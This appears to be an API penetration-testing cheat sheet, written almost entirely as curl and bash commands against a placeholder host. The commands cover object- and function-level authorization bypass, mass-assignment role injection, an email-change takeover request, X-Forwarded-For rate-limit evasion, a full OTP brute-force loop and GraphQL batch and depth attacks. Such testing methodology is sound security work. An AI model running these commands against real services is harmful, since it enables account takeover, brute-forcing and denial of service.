# API Security Testing — REST, GraphQL, Mass Assignment, BOLA/BFLA

Comprehensive API security testing: broken object/function level auth, mass assignment, excessive data exposure, rate limiting bypass.

## Phase 1: API Discovery & Mapping

```bash
# Discover API documentation:
for path in /api/docs /swagger /swagger-ui.html /api-docs /openapi.json \
            /v1/api-docs /v2/api-docs /redoc /graphql /api/swagger.json \
            /api/v1 /api/v2 /api/v3 /_docs; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  [ "$STATUS" != "404" ] && echo "$STATUS $path"
done

# Download OpenAPI spec if found:
curl -s "https://target.com/openapi.json" | jq . > openapi_spec.json
curl -s "https://target.com/swagger.json" | jq . > swagger_spec.json

# Extract all endpoints from OpenAPI:
jq -r '.paths | keys[]' openapi_spec.json 2>/dev/null

# Discover hidden API versions:
for version in v0 v1 v2 v3 v4 beta internal admin; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/api/$version/users")
  echo "$STATUS /api/$version/users"
done

# Find API endpoints in JS bundles:
curl -s "https://target.com/static/app.js" | \
  grep -oE '"/api/[a-zA-Z0-9/_-]+"' | sort -u
```

---

## Phase 2: BOLA (Broken Object Level Authorization)

```bash
# Same as IDOR — but API-specific patterns:

# Test access to other users' objects:
MY_COOKIE="Authorization: Bearer YOUR_TOKEN"
for user_id in $(seq 1 20); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/v1/users/$user_id" -H "$MY_COOKIE")
  echo "$STATUS /users/$user_id"
done

# Test nested resource access:
# /api/users/{user_id}/orders/{order_id}
for order_id in $(seq 1000 1020); do
  curl -s "https://target.com/api/v1/users/VICTIM_ID/orders/$order_id" \
    -H "$MY_COOKIE" | jq -r '.order_id,.amount,.items'
done

# Test GET vs POST/PUT/DELETE discrepancy:
OBJ_ID=1002
curl -s -X GET    "https://target.com/api/v1/objects/$OBJ_ID" -H "$MY_COOKIE"
curl -s -X PUT    "https://target.com/api/v1/objects/$OBJ_ID" -H "$MY_COOKIE" -d '{"name":"pwned"}'
curl -s -X DELETE "https://target.com/api/v1/objects/$OBJ_ID" -H "$MY_COOKIE"
```

---

## Phase 3: BFLA (Broken Function Level Authorization)

```bash
# Low-privilege user accessing admin functions:
USER_TOKEN="Bearer normal_user_token"

# Admin-only endpoints (try with user token):
for endpoint in \
  "/api/v1/admin/users" \
  "/api/v1/admin/config" \
  "/api/v1/management/stats" \
  "/api/v1/internal/debug" \
  "/api/v1/users/all" \
  "/api/v1/reports/audit"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com$endpoint" -H "Authorization: $USER_TOKEN")
  echo "$STATUS $endpoint"
done

# HTTP method bypass:
# Some APIs check GET but miss POST/PUT:
curl -s -X GET    "https://target.com/api/v1/admin/users" -H "Authorization: $USER_TOKEN"
curl -s -X POST   "https://target.com/api/v1/admin/users" -H "Authorization: $USER_TOKEN"
curl -s -X OPTIONS "https://target.com/api/v1/admin/users" -H "Authorization: $USER_TOKEN"

# Try admin actions via non-admin endpoints:
# change another user's email via profile update:
curl -s -X PUT "https://target.com/api/v1/users/VICTIM_ID/email" \
  -H "Authorization: $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com"}'
```

---

## Phase 4: Mass Assignment

```bash
# Inject extra fields that shouldn't be user-controllable:

# User registration — inject role/admin fields:
curl -s -X POST "https://target.com/api/v1/register" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "test",
    "password": "test123",
    "email": "test@test.com",
    "role": "admin",
    "is_admin": true,
    "is_verified": true,
    "credit": 99999
  }' | jq .

# Profile update — inject fields:
curl -s -X PUT "https://target.com/api/v1/profile" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test User",
    "role": "admin",
    "subscription": "premium",
    "balance": 9999.99,
    "admin": true,
    "permissions": ["read","write","admin","delete"]
  }' | jq .

# Use OpenAPI spec to find all model fields:
jq '.components.schemas | to_entries[] | .key, (.value.properties | keys)' openapi_spec.json 2>/dev/null

# Test PUT with fields from GET response + extra fields:
PROFILE=$(curl -s "https://target.com/api/v1/me" -H "Authorization: Bearer TOKEN")
echo $PROFILE | jq '. + {"role": "admin"}'
```

---

## Phase 5: Excessive Data Exposure

```bash
# API returns more data than UI shows:
curl -s "https://target.com/api/v1/users/search?q=john" \
  -H "Authorization: Bearer TOKEN" | jq .

# Compare API response vs UI display:
# API may return: password_hash, ssn, dob, credit_card, internal_id, admin_notes

# Test with different response formats:
curl -s "https://target.com/api/v1/users/1" \
  -H "Accept: application/json" -H "Authorization: Bearer TOKEN" | jq .
curl -s "https://target.com/api/v1/users/1" \
  -H "Accept: application/xml" -H "Authorization: Bearer TOKEN"

# Test field filtering bypass:
# If API supports ?fields=name,email — try:
curl -s "https://target.com/api/v1/users/1?fields=name,email,password,token" \
  -H "Authorization: Bearer TOKEN"
curl -s "https://target.com/api/v1/users/1?include=all" \
  -H "Authorization: Bearer TOKEN"

# Check if batch/bulk endpoints expose more:
curl -s -X POST "https://target.com/api/v1/users/batch" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"ids": [1, 2, 3, 4, 5]}'
```

---

## Phase 6: Rate Limiting & Brute Force

```bash
# Test rate limiting on sensitive endpoints:
for i in $(seq 1 50); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/api/v1/auth/login" \
    -d '{"username":"admin","password":"wrong'$i'"}')
  echo "$i: $STATUS"
  [ "$STATUS" = "429" ] && { echo "Rate limit at $i"; break; }
done

# Bypass rate limiting — rotate IPs via headers:
for ip in "1.1.1.$RANDOM" "2.2.2.$RANDOM" "3.3.3.$RANDOM"; do
  curl -s -X POST "https://target.com/api/v1/login" \
    -H "X-Forwarded-For: $ip" \
    -d '{"username":"admin","password":"password123"}'
done

# Rate limit bypass via endpoint variation:
for path in /api/v1/login /api/v2/login /api/Login /API/v1/login; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com$path" -d '{"username":"admin","password":"test"}')
  echo "$STATUS $path"
done

# Test OTP/2FA brute force:
for code in $(seq -w 0000 9999); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/api/v1/verify-otp" \
    -H "Cookie: SESSION" -d "otp=$code")
  [ "$STATUS" = "200" ] && { echo "Valid OTP: $code"; break; }
done
```

---

## Phase 7: GraphQL Security

```bash
# Introspection query (get full schema):
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}"}'

# Test if introspection is disabled (common security measure):
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}'  # should still work

# Query field suggestion (even without introspection):
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{user{id,email,passwor}}"}'
# Error will suggest "password" — leaks field names

# GraphQL BOLA:
curl -s -X POST "https://target.com/graphql" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: \"VICTIM_ID\") { email, phone, ssn } }"}'

# Batch query abuse (bypass rate limiting):
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{login(username:\"admin\",password:\"pass1\")}"},
    {"query":"mutation{login(username:\"admin\",password:\"pass2\")}"},
    {"query":"mutation{login(username:\"admin\",password:\"pass3\")}"}
  ]'

# Nested query DoS (depth attack):
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{user{friends{friends{friends{friends{friends{id,name}}}}}}}"}'
```

---

## Pro Tips

1. **Swagger/OpenAPI first** — gives complete endpoint list, including undocumented admin routes
2. **Old API versions** — `/api/v1` often has weaker auth than `/api/v2`; always test all versions
3. **Mass assignment** — send ALL fields you see in GET response back in PUT/POST + extras
4. **GraphQL introspection** → map full schema → find admin mutations → test without auth
5. **Batch endpoints** — `/batch` or array body → rate limit bypass + bulk data exposure
6. **BFLA via HTTP method** — endpoint checks `role` for GET but forgets to check POST/DELETE
7. **Field names from errors** — "did you mean `password`?" in error message leaks schema

## Summary

API testing flow: discover spec (swagger/openapi) → enumerate all endpoints including old versions → test BOLA (object ID swap) → test BFLA (admin endpoints with user token) → mass assignment (inject role/admin fields) → check for data over-exposure → rate limit bypass → GraphQL introspection if present.
